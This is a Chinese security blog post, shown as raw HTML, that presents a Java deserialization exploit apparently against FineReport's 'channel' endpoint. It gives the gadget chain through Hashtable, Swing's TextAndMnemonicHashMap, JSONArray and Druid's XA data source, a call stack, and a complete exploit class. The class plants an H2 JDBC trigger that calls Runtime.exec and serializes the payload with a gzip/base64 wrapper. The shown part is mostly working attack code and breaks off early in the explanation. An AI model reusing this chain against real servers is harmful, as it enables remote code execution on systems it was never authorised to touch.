<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="漏洞原理分两块讲，第一个是反序列化点，第二个是绕黑名单的新链子。 Hashtable链EXP利用链如下： 12345Hashtable#readObject -&gt; Hashtable#reconstitutionPut -&gt; abstractMap#equals -&gt; TextAndMnemonicHashMap#get -&gt; com.fr.json.JSONArray#t">
<meta property="og:type" content="article">
<meta property="og:title" content="某v10 channel 反序列化 出网通杀">
<meta property="og:url" content="https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/index.html">
<meta property="og:site_name" content="Jasper_sec">
<meta property="og:description" content="漏洞原理分两块讲，第一个是反序列化点，第二个是绕黑名单的新链子。 Hashtable链EXP利用链如下： 12345Hashtable#readObject -&gt; Hashtable#reconstitutionPut -&gt; abstractMap#equals -&gt; TextAndMnemonicHashMap#get -&gt; com.fr.json.JSONArray#t">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/88148d3c0a0fb06ce6dfe4928810a7f5.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/13d4416914c282ad6ae1ab5b86649ea7.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c98959e2d1453085e954b78c3e29d3f8.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/22c4a8d04a1723648cebec9db017ba91.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/108a5bbd5d306a242589c7eb4b4daae1.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fe0573e5365ab908406f5381ca9af935.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3a66400a2ad6bc02c4afa1fd16290a7b.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/14b38698a00b7de4312bc7547742e614.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fc165e18bc3f42368c6c40195f6d647b.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d716600ceef9543768c7f24ed3d76387.png">
<meta property="article:published_time" content="2024-08-20T17:57:00.000Z">
<meta property="article:modified_time" content="2025-03-19T14:54:44.929Z">
<meta property="article:author" content="Jasper_sec">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="反序列化">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/88148d3c0a0fb06ce6dfe4928810a7f5.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>某v10 channel 反序列化 出网通杀</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/12/16/0x12%20%E5%9B%BD%E5%9F%8E%E6%9D%AF2024%20writeup%20with%20docker/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/07/01/0x17%20CodeQL%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&text=某v10 channel 反序列化 出网通杀"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&is_video=false&description=某v10 channel 反序列化 出网通杀"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=某v10 channel 反序列化 出网通杀&body=Check out this article: https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&title=某v10 channel 反序列化 出网通杀"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&name=某v10 channel 反序列化 出网通杀&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/2024/08/21/0x14%20%E6%9F%90v10%20channel%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20%E5%87%BA%E7%BD%91%E9%80%9A%E6%9D%80/&t=某v10 channel 反序列化 出网通杀"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <!-- 
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">Hashtable链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.1.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%AE%BE%E7%BD%AEsetter"><span class="toc-number">1.1.2.</span> <span class="toc-text">问题一：为什么要设置setter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88Map%E5%89%8D%E5%90%8Eput%E4%B8%A4%E6%AC%A1"><span class="toc-number">1.1.3.</span> <span class="toc-text">问题二：为什么Map前后put两次</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%89%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AE%BE%E7%BD%AEloadFactor"><span class="toc-number">1.1.4.</span> <span class="toc-text">问题三：为什么设置loadFactor</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap%E9%93%BE"><span class="toc-number">1.2.</span> <span class="toc-text">HashMap链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hsql"><span class="toc-number">2.1.</span> <span class="toc-text">hsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#h2"><span class="toc-number">2.2.</span> <span class="toc-text">h2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E8%84%9A%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">发送脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
      </div>
     -->
    <div id="toc">
      <div id="toc-div" class="toc-article" >
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashtable%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">Hashtable链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.1.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%AE%BE%E7%BD%AEsetter"><span class="toc-number">1.1.2.</span> <span class="toc-text">问题一：为什么要设置setter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88Map%E5%89%8D%E5%90%8Eput%E4%B8%A4%E6%AC%A1"><span class="toc-number">1.1.3.</span> <span class="toc-text">问题二：为什么Map前后put两次</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E4%B8%89%EF%BC%9A%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AE%BE%E7%BD%AEloadFactor"><span class="toc-number">1.1.4.</span> <span class="toc-text">问题三：为什么设置loadFactor</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HashMap%E9%93%BE"><span class="toc-number">1.2.</span> <span class="toc-text">HashMap链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hsql"><span class="toc-number">2.1.</span> <span class="toc-text">hsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#h2"><span class="toc-number">2.2.</span> <span class="toc-text">h2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E8%84%9A%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">发送脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
        
      </div>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        某v10 channel 反序列化 出网通杀
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Jasper_sec</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-08-20T17:57:00.000Z" class="dt-published" itemprop="datePublished">2024-08-21</time>
        
        (Updated: <time datetime="2025-03-19T14:54:44.929Z" class="dt-updated" itemprop="dateModified">2025-03-19</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>分两块讲，第一个是反序列化点，第二个是绕黑名单的新链子。</p>
<h3 id="Hashtable链"><a href="#Hashtable链" class="headerlink" title="Hashtable链"></a>Hashtable链</h3><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>利用链如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hashtable#readObject -&gt; </span><br><span class="line">Hashtable#reconstitutionPut -&gt; </span><br><span class="line">abstractMap#equals -&gt; </span><br><span class="line">TextAndMnemonicHashMap#get -&gt; </span><br><span class="line">com.fr.json.JSONArray#toString -&gt;  com.fr.third.alibaba.druid.pool.xa.DruidXADataSource#getXConnection</span><br></pre></td></tr></table></figure>

<p>函数调用栈</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">createPhysicalConnection:<span class="number">1826</span>, DruidAbstractDataSource (com.alibaba.druid.pool)</span><br><span class="line">init:<span class="number">936</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1473</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1469</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getXAConnection:<span class="number">42</span>, DruidXADataSource (com.alibaba.druid.pool.xa)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">688</span>, BeanPropertyWriter (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">772</span>, BeanSerializerBase (com.fr.third.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeContents:<span class="number">119</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">79</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">18</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">_serialize:<span class="number">479</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">318</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">_writeValueAndClose:<span class="number">4719</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">3964</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">encode:<span class="number">99</span>, EmbedJson (com.fr.json.revise)</span><br><span class="line">encode:<span class="number">560</span>, JSONArray (com.fr.json)</span><br><span class="line">toString:<span class="number">590</span>, JSONArray (com.fr.json)</span><br><span class="line">get:<span class="number">1251</span>, UIDefaults$TextAndMnemonicHashMap (javax.swing)</span><br><span class="line">equals:<span class="number">492</span>, AbstractMap (java.util)</span><br><span class="line">reconstitutionPut:<span class="number">1241</span>, Hashtable (java.util)</span><br><span class="line">readObject:<span class="number">1215</span>, Hashtable (java.util)</span><br></pre></td></tr></table></figure>

<p>EXP（h2 jdbc attack）：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> utils.SerializeUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        druidXADataSource.getXAConnection();</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过jackson触发getter即getXAConnection()，JSONArray的toString会调用jackson原生反序列化</span></span><br><span class="line">        <span class="comment">//即writeValueAsString，从而触发getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发UIDefaults$TextAndMnemonicHashMap#get方法</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidAbstractDataSource.class,<span class="string">&quot;transactionHistogram&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidDataSource.class,<span class="string">&quot;initedLatch&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtils.serializeBase64(hashtable);</span><br><span class="line"><span class="comment">//        System.out.println(gzipWrapper(payload));</span></span><br><span class="line">        SerializeUtils.unserializeBase64(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">gzipWrapper</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="comment">// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] maliciousBytes = bytes;</span><br><span class="line">        <span class="comment">// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(maliciousBytes);</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line">        <span class="type">byte</span>[] gzipBytes = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(gzipBytes);</span><br><span class="line">        <span class="keyword">return</span> exp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="问题一：为什么要设置setter"><a href="#问题一：为什么要设置setter" class="headerlink" title="问题一：为什么要设置setter"></a>问题一：为什么要设置setter</h4><p>setUrl最简单，因为要触发jdbc attack，而其他三个setter的作用则要分析一下</p>
